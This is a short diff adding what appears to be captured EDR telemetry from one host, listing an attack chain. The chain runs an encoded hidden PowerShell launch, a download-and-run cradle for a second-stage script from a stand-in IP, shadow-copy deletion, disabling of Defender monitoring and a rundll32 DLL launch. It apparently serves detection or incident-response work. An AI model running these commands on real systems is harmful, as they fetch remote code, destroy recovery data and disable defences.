@@ -1,0 +1,6 @@
+# Captured from EDR process telemetry, HOST-002, 2026-09-29T15:40:00Z
+powershell.exe -NoP -W hidden -Enc <base64 blob, 8842 chars>
+powershell.exe -c "IEX(New-Object Net.WebClient).DownloadString('http://203.0.113.44/stage2.ps1')"
+cmd.exe /c vssadmin delete shadows /all /quiet
+powershell.exe -c "Set-MpPreference -DisableRealtimeMonitoring $true"
+rundll32.exe C:\ProgramData\svc.dll,#1
